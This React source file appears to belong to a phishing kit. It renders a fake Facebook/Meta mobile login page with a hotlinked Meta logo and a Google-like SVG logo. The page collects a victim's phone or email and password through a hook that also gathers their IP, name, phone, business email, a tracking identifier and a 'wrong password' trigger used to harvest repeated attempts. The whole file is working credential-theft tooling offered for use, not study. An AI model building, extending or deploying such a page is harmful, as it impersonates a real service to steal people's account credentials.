import React, { useState, useContext } from "react";
import styled from "styled-components";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

const Container = styled.div`
  display: flex;
  flex-direction: column;
  background-color: #fff;
  height: 100vh; /* Ensure full viewport height */
  width: 100%;
  max-width: 100%;
  margin: 0;
  /* padding: 0; default, no need to specify unless overriding */
  justify-content: space-between; /* Distribute children vertically */
  overflow: hidden; /* Prevent scrollbars if content slightly overflows */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const LoginBoxWrapper = styled.div`
  background-color: #fff;
  /* padding: 20px; User removed */
  width: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center; /* Center FormSection vertically within this box */
  /* flex-grow: 1; Removed, should be sized by its content */
`;

const TopSection = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 20px;
  height: 23px;
`;

const LanguageSelector = styled.div`
  color: rgb(70, 90, 105);
  font-size: 13px;
  font-weight: 400;
  text-align: center;
  margin-bottom: 10px;
  cursor: pointer;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const Logo = styled.div`
  text-align: center;
  margin-top: 0;
  // flex-grow: 1; /* Expand to fill available space */
  flex-shrink: 100; /* Allow shrinking if needed, though flex-grow:1 dominates */
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: auto; /* Height will be determined by flex-grow */
  padding-top: 20px;
  padding-bottom: 10px;

  img {
    max-height: 60px;
    object-fit: contain;
  }
`;

const FormSection = styled.div`
  display: flex;
  flex-direction: column;
  width: 100%;
  margin-top: 0; /* Centering handled by LoginBoxWrapper or direct placement */
  /* flex-grow: 1; Removed, let content define its height */
`;

const InputsContainer = styled.div`
  flex-direction: column;
  justify-content: flex-start;
  padding: 0 16px;
`;

const CustomInput = styled.input`
  border: 1px solid #dddfe2 !important;
  border-radius: 10px !important; /* User updated */
  /* Adjusted padding for floating label: top, right, bottom, left */
  padding: 22px 16px 6px 16px !important;
  background-color: #fff;
  margin-top: 0;
  width: 100%;
  font-size: 17px;
  color: #1d2129;
  line-height: 1.34;
  min-height: auto;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  &.redborder {
    border: 1px solid red !important;
  }

  ::placeholder {
    /* Placeholder is used for the :not(:placeholder-shown) selector, so make it transparent */
    color: transparent;
    user-select: none; /* Prevent selection of the space placeholder */
  }
  /* margin-bottom: 12px; Moved to FormFloatingWrapper */

  &:focus {
    outline: none;
    border-color: #0866ff !important;
    box-shadow: 0 0 0 2px #e7f3ff;
  }
`;

const FormFloatingWrapper = styled.div`
  position: relative;
  margin-bottom: 12px; /* Was on CustomInput */
`;

const FloatingLabel = styled.label`
  position: absolute;
  top: 14px; /* Initial vertical position */
  left: 16px; /* Initial horizontal position */
  font-size: 17px;
  font-weight: 400;
  color: #90949c; /* Original placeholder color */
  pointer-events: none;
  transition: all 0.2s ease-out;
  background-color: #fff; /* For "notch" effect when floated */
  padding: 0 4px; /* Horizontal padding for the notch */
  line-height: 1.34; /* Match CustomInput */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  /* Style for when the associated input is disabled */
  ${CustomInput}:disabled ~ & {
    color: #adb5bd; /* Muted color for disabled state */
  }
`;

// Styles for the floated label state within FormFloatingWrapper
const StyledFormFloatingWrapper = styled(FormFloatingWrapper)`
  ${CustomInput}:focus ~ ${FloatingLabel},
    ${CustomInput}:not(:placeholder-shown) ~ ${FloatingLabel} {
    top: 0;
    left: 12px; /* Indent when floated */
    transform: translateY(
      -50%
    ); /* Center vertically on the input's top border */
    font-size: 13px; /* Smaller font for floated label */
    height: auto;
    line-height: 1;
    color: #1d2129; /* Default text color when floated */
  }

  ${CustomInput}:focus:not(:disabled) ~ ${FloatingLabel} {
    color: #0866ff; /* Highlight color when input is focused and enabled */
  }
`;

const LoginButton = styled.button`
  width: 100%;
  height: 40px; /* User updated */
  background-color: #0866ff;
  border: none;
  border-radius: 30px; /* User updated */
  color: rgb(255, 255, 255);
  font-size: 18px; /* User updated */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  padding: 0 16px;
  margin-top: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 48px;

  &:hover {
    background-color: #005ce6;
  }
`;

const ForgotPassword = styled.div`
  text-align: center;
  margin-top: 16px;
  height: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  padding-bottom: 16px;
  margin-left: 0;
  margin-right: 0;
  padding-left: 0;
  padding-right: 0;
  border-bottom: none;

  a {
    color: rgb(73, 73, 73); /* User updated */
    font-size: 15px; /* User updated */
    font-weight: 500;
    font-family: FBook, Helvetica, system-ui, sans-serif !important;
    text-decoration: none;
    line-height: 1.248;

    &:hover {
      text-decoration: underline;
    }
  }
`;

const BottomSection = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: auto;
  flex-grow: 0;
  flex-shrink: 0;
  padding-bottom: 20px;
  padding-top: 20px;
  justify-content: flex-end;
  width: 100%;
`;

const CreateAccountButtonContainer = styled.div`
  width: 100%;
  margin-top: 1.5rem; /* This was from a previous step, check if still needed with new layout */
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0 12px; /* User updated */
`;

const CreateAccountButton = styled.button`
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 17px;
  border-radius: 30px; /* User added */
  padding: 0 16px;
  height: 48px;
  min-width: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  line-height: 48px;
  margin-top: 0;
  flex-grow: 1;
  background-color: transparent;
  border: 1px solid #0064e0;
  color: #0064e0;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  &:hover {
    background-color: rgba(0, 100, 224, 0.05);
  }
`;

const MobileFooter = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  /* margin-top: auto; Removed, positioned by Container's space-between */
  flex-grow: 0;
  flex-shrink: 0;
  padding-bottom: 0;
  justify-content: flex-end;
  width: 100%;
  margin-bottom: 10px; /* User added */
`;

const MetaLogo = styled.div`
  text-align: center;
  margin: 10px 0;
  img {
    height: 12px;
  }
`;

const FooterLinks = styled.div`
  display: flex;
  justify-content: center;
  flex-wrap: wrap;

  span {
    color: rgb(99, 120, 138);
    font-size: 10px;
    margin: 0 4px 4px;
    cursor: pointer;
    font-family: FBook, Helvetica, system-ui, sans-serif !important;
  }
`;

const Spinner = styled.div`
  width: 20px;
  height: 20px;
  border: 3px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top-color: white;
  animation: spin 1s ease-in-out infinite;
  margin: 0 auto;

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
`;

const ValidationError = styled.div`
  color: red;
  font-size: 13px;
  font-weight: 500;
  margin-top: 4px;
  text-align: left;
  margin-bottom: 8px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

function Step2Mobile({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const [isValidEmail, setIsValidEmail] = useState(false);
  const { setAllData, AllData } = useContext(DataContext);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();

    // Accept any input with reasonable length (phone number, username, or email)
    if (e.target.value.length >= 3) {
      setIsValidEmail(true);
    } else {
      setIsValidEmail(false);
    }
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  return (
    <Container>
      <TopSection>
        <LanguageSelector>English (US)</LanguageSelector>
      </TopSection>
      <Logo>
        <svg width="74" height="24" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
          <g fill="none" fillRule="evenodd">
            <path d="M9.24 8.19v5.07h7.2c-.3 1.64-1.73 4.81-5.52 4.81-3.32 0-6.03-2.76-6.03-6.15s2.71-6.15 6.03-6.15c1.89 0 3.16.8 3.88 1.5l3.69-3.55C16.82.84 13.92 0 9.64 0 4.67 0 .55 4.01.55 8.97s4.12 8.97 9.09 8.97c5.25 0 8.73-3.69 8.73-8.88 0-.6-.06-1.05-.13-1.5l-8.6-.01z" fill="#4285F4"/>
            <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
            <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
            <path d="M51.98 6.19c-3.17 0-5.74 2.48-5.74 5.81 0 3.38 2.59 5.81 6.02 5.81 2.43 0 3.84-1.06 4.7-2.01l-1.93-1.28c-.52.75-1.24 1.27-2.75 1.27-1.26 0-2.16-.58-2.73-1.71l7.53-3.11-.34-.88c-.61-1.64-2.43-3.12-4.75-3.12l-.01.01zm.13 2.31c.95 0 1.76.53 2.03 1.22l-5.02 2.08c-.03-2.32 1.78-3.3 2.99-3.3z" fill="#4285F4"/>
            <path d="M45.39.33h2.52v17.45h-2.52z" fill="#34A853"/>
            <path d="M55.82 15.54V.4h3.38v14.25c0 3.06 2.04 4.73 4.53 4.73 2.49 0 4.53-1.67 4.53-4.73V.4h3.38v14.25c0 5.05-3.78 7.99-7.91 7.99s-7.91-2.94-7.91-7.99z" fill="#EA4335"/>
          </g>
        </svg>
      </Logo>
      <LoginBoxWrapper>
        <FormSection>
          <InputsContainer>
            <StyledFormFloatingWrapper>
              <CustomInput
                type="text"
                id="email-input"
                value={Email}
                onChange={handleEmailChange}
                placeholder=" "
                className={`form-control ${
                  !isValidEmail && triedSubmit ? "redborder" : ""
                }`}
                disabled={isLoading}
              />
              <FloatingLabel htmlFor="email-input">
                Mobile number or email address
              </FloatingLabel>
            </StyledFormFloatingWrapper>
            {emailError && <ValidationError>{emailError}</ValidationError>}

            <StyledFormFloatingWrapper>
              <CustomInput
                type="password"
                id="password-input"
                value={password}
                onChange={handlePasswordChange}
                placeholder=" "
                className={`form-control ${
                  password.length < 5 && triedSubmit ? "redborder" : ""
                }`}
                disabled={isLoading}
              />
              <FloatingLabel htmlFor="password-input">Password</FloatingLabel>
            </StyledFormFloatingWrapper>
            {passwordError && (
              <ValidationError>{passwordError}</ValidationError>
            )}

            <LoginButton onClick={handleSubmit}>
              {isLoading ? <Spinner /> : "Log in"}
            </LoginButton>

            <ForgotPassword>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  ButtonActions.handleForgottenPassword({
                    AllData,
                    setAllData,
                    Unik,
                    Email,
                    Ip,
                  });
                }}
              >
                Forgotten password?
              </a>
            </ForgotPassword>
          </InputsContainer>
        </FormSection>
      </LoginBoxWrapper>

      <MobileFooter>
        <BottomSection>
          <CreateAccountButtonContainer>
            <CreateAccountButton
              onClick={(e) => {
                e.preventDefault();
                ButtonActions.handleCreateAccount({
                  AllData,
                  setAllData,
                  Unik,
                  Email,
                  Ip,
                });
              }}
            >
              Create new account
            </CreateAccountButton>
          </CreateAccountButtonContainer>
        </BottomSection>
        <MetaLogo>
          <img
            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png"
            alt="Meta logo"
          />
        </MetaLogo>
        <FooterLinks>
          <span>About</span>
          <span>Help</span>
          <span>More</span>
        </FooterLinks>
      </MobileFooter>
    </Container>
  );
}

export default Step2Mobile;
